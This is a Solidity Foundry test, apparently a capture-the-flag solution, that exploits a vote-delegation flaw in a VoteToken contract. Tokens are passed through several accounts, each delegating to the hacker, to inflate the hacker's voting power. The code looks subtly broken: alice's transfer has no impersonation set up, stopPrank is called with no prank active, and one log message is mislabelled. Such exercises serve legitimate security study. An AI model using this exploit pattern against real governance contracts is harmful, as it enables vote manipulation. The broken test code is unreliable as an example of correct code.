// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "../src/Voting-machine/VotingMachine.sol";

contract exploitTest is Test {
    VoteToken vToken;
    address public owner = address(0);
    address public hacker = address(1337);

    address public alice = address(1);
    address public bob = address(2);
    address public carl = address(3);

    function setUp() public {
        vm.startPrank(owner);
        vToken = new VoteToken();
        vToken.mint(alice, 1000);
        vm.stopPrank();
    }

    function testExploitVote() public {
        // soluiton
        vToken.delegate(hacker);
        vToken.transfer(bob, vToken.balanceOf(alice));

        vm.stopPrank();

        vm.startPrank(bob);
        vToken.delegate(hacker);
        vToken.transfer(carl, vToken.balanceOf(bob));

        vm.stopPrank();

        vm.startPrank(carl);
        vToken.delegate(hacker);
        vToken.transfer(hacker, vToken.balanceOf(carl));

        vm.stopPrank();

        uint256 hacker_vote = vToken.getVotes(hacker);
        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

        uint256 hacker_balance = vToken.balanceOf(hacker);
        console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

        assertEq(hacker_vote, 1000);
        assertEq(hacker_balance, 1000);
    }
}
